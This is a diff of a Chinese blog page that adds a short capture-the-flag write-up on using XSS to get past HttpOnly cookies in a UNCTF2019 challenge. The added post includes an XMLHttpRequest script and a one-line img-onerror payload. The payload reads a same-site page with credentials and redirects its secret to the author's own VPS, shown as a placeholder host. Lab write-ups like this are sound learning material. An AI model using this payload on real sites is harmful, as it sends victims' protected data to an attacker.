@@ -47,13 +47,19 @@
     sidebarPadding: 40
   };
 </script>
-  <meta property="og:type" content="article">
+  <meta name="description" content="最近整理的时候，突然想起来以前有一题XSS的题，设置了HTTPonly，当时没想到怎么绕过，后来看wp有些不懂，当时JS代码还不太熟（现在也菜~）。虽然环境和源码都以及不在了。不过还是记忆犹新的。">
+<meta name="keywords" content="JS">
+<meta property="og:type" content="article">
 <meta property="og:title" content="XSS绕过HTTPonly">
 <meta property="og:url" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;05&#x2F;XSS%E7%BB%95%E8%BF%87HTTPonly&#x2F;index.html">
 <meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="最近整理的时候，突然想起来以前有一题XSS的题，设置了HTTPonly，当时没想到怎么绕过，后来看wp有些不懂，当时JS代码还不太熟（现在也菜~）。虽然环境和源码都以及不在了。不过还是记忆犹新的。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-05-05T14:56:08.585Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;05&#x2F;XSS%E7%BB%95%E8%BF%87HTTPonly&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;05&#x2F;XSS%E7%BB%95%E8%BF%87HTTPonly&#x2F;2.png">
+<meta property="og:updated_time" content="2020-05-05T15:35:31.241Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;05&#x2F;05&#x2F;XSS%E7%BB%95%E8%BF%87HTTPonly&#x2F;1.png">
 
 <link rel="canonical" href="https://chenzidu.github.io/2020/05/05/XSS%E7%BB%95%E8%BF%87HTTPonly/">
 
@@ -236,8 +242,20 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2020-05-05 22:56:08" itemprop="dateCreated datePublished" datetime="2020-05-05T22:56:08+08:00">2020-05-05</time>
+              <time title="创建时间：2020-05-05 22:56:08 / 修改时间：23:35:31" itemprop="dateCreated datePublished" datetime="2020-05-05T22:56:08+08:00">2020-05-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index">
+                    <span itemprop="name">XSS</span>
+                  </a>
+                </span>
             </span>
 
           
@@ -248,7 +266,7 @@
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">字数统计:</span>
-           <span class="post-count">0(字)</span>
+           <span class="post-count">457(字)</span>
            
          </span>
 	  
@@ -292,7 +310,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <p>最近整理的时候，突然想起来以前有一题XSS的题，设置了HTTPonly，当时没想到怎么绕过，后来看wp有些不懂，当时JS代码还不太熟（现在也菜~）。虽然环境和源码都以及不在了。不过还是记忆犹新的。</p>
+<a id="more"></a>
+<p>云复现一下~</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>正常XSS能成功，但是不能获取Cookie,所以必须绕过。查看同域名下其他页面，有没有带COOKIE的请求。</p>
+<p><img src="1.png" alt=""></p>
+<p><img src="2.png" alt=""></p>
+<p>构造XHR(ajax是XMLHttpRequest对象)请求:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">		xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">        <span class="comment">//是否能跨域</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">		xmlhttp.withCredentials=<span class="literal">true</span>;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">		xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">		if(xmlhttp.readyState==4)&#123;     </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">		    location.href=<span class="string">'http://读取COOkie用的域名（自己的VPS）/?flag='</span>+xmlhttp.responseText.match(<span class="string">'flag\&#123;(.*?)\&#125;'</span>)[<span class="number">1</span>]</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">		&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">		&#125;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">        <span class="comment">//设置连接信息</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">        <span class="comment">//第一个参数表示http的请求方式，支持所有http的请求方式，主要使用get和post</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">        <span class="comment">//第二个参数表示请求的url地址，get方式请求的参数也在url中</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">        <span class="comment">//第三个参数表示采用异步还是同步方式交互，true表示异步</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">		xmlhttp.open(<span class="string">'GET'</span>,<span class="string">'/index.php/treehole/view?id='</span>,<span class="literal">true</span>);</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">        <span class="comment">//4.发送数据，开始和服务器端进行交互</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">        <span class="comment">//同步方式下，send这句话会在服务器段数据回来后才执行完</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">        <span class="comment">//异步方式下，send这句话会立即完成执行</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"><span class="actionscript">		xmlhttp.send(<span class="string">''</span>);</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></pre></td></tr></table></figure>
+<p>xmlhttp.readyState变化：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: 请求未初始化</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: 服务器连接已建立</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>: 请求已接收</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="number">3</span>: 请求处理中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>: 请求已完成，且响应已就绪 xmlhttp.status==<span class="number">200</span></span></pre></td></tr></table></figure>
+
+<p>构造XSS-Payload:</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">'/efefefe'</span> onerror="xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function()&#123;if(xmlhttp.readyState==4)&#123;location.href=<span class="string">'http://读取COOkie用的域名（自己的VPS）/?flag='</span> + xmlhttp.responseText.match(<span class="string">'flag\&#123;(.*?)\&#125;'</span>)[1]&#125;&#125;;xmlhttp.open(<span class="string">'GET'</span>,<span class="string">'/index.php/treehole/view?id='</span>,true);xmlhttp.send(<span class="string">''</span>);"/&gt;</span></pre></td></tr></table></figure>
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019UNCTF" target="_blank" rel="noopener">UNCTF2019WP</a><br><a href="https://www.w3school.com.cn/ajax/ajax_xmlhttprequest_send.asp" target="_blank" rel="noopener">W3-XHR请求</a></p>
+
     </div>
 
     
@@ -300,6 +334,9 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/JS/" rel="tag"># JS</a>
+          </div>
 
         
 
@@ -349,6 +386,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -377,7 +415,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-count">20</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
